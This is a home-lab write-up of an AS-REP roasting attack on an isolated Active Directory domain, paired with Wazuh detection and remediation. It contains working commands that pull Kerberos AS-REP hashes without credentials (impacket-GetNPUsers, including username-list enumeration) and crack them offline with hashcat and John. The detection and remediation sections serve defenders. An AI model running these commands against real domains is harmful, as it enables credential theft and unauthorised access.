# Project 02 — AS-REP Roasting (T1558.004)

Attack `b.otieno` (misconfig #2 — Kerberos pre-authentication disabled), crack the
password offline, then detect the attack in Wazuh.

---

## 1. Scenario
Kerberos normally makes a user prove they know their password *before* the DC will
hand out an authentication ticket — this is **pre-authentication**. `b.otieno` has
pre-auth **disabled** (`DoesNotRequirePreAuth = True`), so the DC will return that
user's AS-REP to **anyone who asks for it**. The AS-REP contains data encrypted with
the user's password-derived key, so an attacker takes it offline and brute-forces the
password. The killer detail: this needs **no valid credentials at all** — only the
username. That makes AS-REP roasting a favourite *pre-access* technique, run before an
attacker has any foothold in the domain.

**Phase:** Red — power on **KALI01 + DC01** only (Wazuh off). See the
[operating guide](../../docs/low-ram-operating-guide.md).

## 2. Attack (from KALI01)

No credentials are required — the attacker only needs to reach the DC and know (or
guess) the username.

```bash
# Ask the DC for an AS-REP for an account with pre-auth disabled. -no-pass = no creds.
impacket-GetNPUsers lab.local/b.otieno -dc-ip 10.10.10.10 -no-pass \
    -format hashcat -outputfile asrep.hashes
```

If you don't already know which accounts are roastable, feed a username wordlist and
let the DC tell you — only the pre-auth-disabled accounts return a hash:

```bash
impacket-GetNPUsers lab.local/ -dc-ip 10.10.10.10 -no-pass \
    -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

Expected: a `$krb5asrep$23$b.otieno@LAB.LOCAL:...` hash. The `23` = RC4 (etype 0x17),
the crackable encryption type.

Crack it offline. The canonical tool is **hashcat mode 18200 (AS-REP)**:
```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
On this GPU-less host I crack with **John the Ripper** instead (same hash, CPU, no
OpenCL dependency — see the run log for why):
```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes
```

> **What I proved:** I recovered a domain user's password with **zero** starting
> credentials — pure pre-auth misconfiguration abuse, the kind of thing an attacker
> does before they have any foothold.

## 3. Telemetry this generates
On DC01, the AS-REQ writes **Event ID 4768** (a Kerberos authentication ticket / TGT
was requested) with:
- **Pre-Authentication Type `0`** — the tell. A normal interactive logon shows
  pre-auth type `2` (encrypted timestamp). Type `0` means the DC issued the TGT
  *without* the client proving knowledge of the password — exactly what a
  pre-auth-disabled account allows.
- **Ticket Encryption Type `0x17`** (RC4) — the crackable type.

A 4768 with pre-auth type `0` is the AS-REP-roast signature.

## 4. Detection (in Wazuh — blue phase)
Bring up WAZUH01 (see operating guide). The DC's Wazuh agent forwards Security events.
Search / alert on:
```
data.win.system.eventID:4768 AND data.win.eventdata.preAuthType:0
```
A custom rule for this lives in
[`../../wazuh/custom-rules/local_rules.xml`](../../wazuh/custom-rules/local_rules.xml)
(rule id **`100011`**, level 10). It fires on any 4768 whose `preAuthType` is `0`.

## 5. Remediation (how a defender fixes it)
- **Re-enable Kerberos pre-authentication** on every account (it is the default; the
  lab explicitly turned it off). In AD Users & Computers, uncheck *"Do not require
  Kerberos preauthentication"* on the account, or:
  ```powershell
  Set-ADAccountControl -Identity b.otieno -DoesNotRequirePreAuth $false
  ```
- **Audit** for `DoesNotRequirePreAuth = True` across the domain on a schedule:
  ```powershell
  Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth
  ```
- **Enforce strong passwords** so that even a leaked AS-REP is not crackable offline.
- **Alert** on 4768 with pre-auth type 0 (the rule above).

Reset the lab afterward by restoring DC01's clean snapshot.

## 6. Evidence

**Red phase** — screenshots captured live from the KALI01 GUI terminal:

| # | Shot | What it shows |
|---|------|---------------|
| 1 | [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png) | Kali on `10.10.10.40` reaching DC01 (ping, 0% loss) |
| 2 | [`evidence/02-getnpusers-asrep.png`](evidence/02-getnpusers-asrep.png) | `impacket-GetNPUsers -no-pass` pulling `b.otieno`'s AS-REP hash with **no credentials** |
| 3 | [`evidence/03-john-cracks-password.png`](evidence/03-john-cracks-password.png) | John cracking the AS-REP → **`b.otieno : Password1`** |
| 4 | [`evidence/04-full-chain.png`](evidence/04-full-chain.png) | The whole chain in one full-screen terminal: reach → roast → crack → `--show` |

**Blue phase** — screenshots from the Wazuh dashboard:

| # | Shot | What it shows |
|---|------|---------------|
| 5 | [`evidence/05-wazuh-asrep-alert.png`](evidence/05-wazuh-asrep-alert.png) | Discover filtered to `rule.id:100011` — the alert firing on 4768 / preAuthType 0 |
| 6 | [`evidence/06-wazuh-alert-detail.png`](evidence/06-wazuh-alert-detail.png) | The alert's expanded document — full `data.win.*` field table for the AS-REQ |

Raw command output:
- [`evidence/getnpusers_output.txt`](evidence/getnpusers_output.txt) — AS-REP hash pulled with no password
- [`evidence/john_output.txt`](evidence/john_output.txt) — offline crack recovering `Password1`

See [`RUN-LOG.md`](RUN-LOG.md) for the exact execution record.
